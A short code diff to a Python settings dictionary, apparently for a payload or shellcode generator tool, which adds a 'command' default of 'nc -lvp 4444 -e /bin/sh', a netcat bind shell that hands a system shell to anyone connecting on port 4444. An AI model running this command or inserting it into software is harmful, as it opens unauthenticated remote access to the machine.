@@ -26,5 +26,6 @@ all_var ={
     'bhaddr'     : '',
     'size'       : '600',
     'output'     : 'output',
-    'encrypt'    : 'unencrypted'
+    'encrypt'    : 'unencrypted',
+    'command'    : 'nc -lvp 4444 -e /bin/sh'
 }
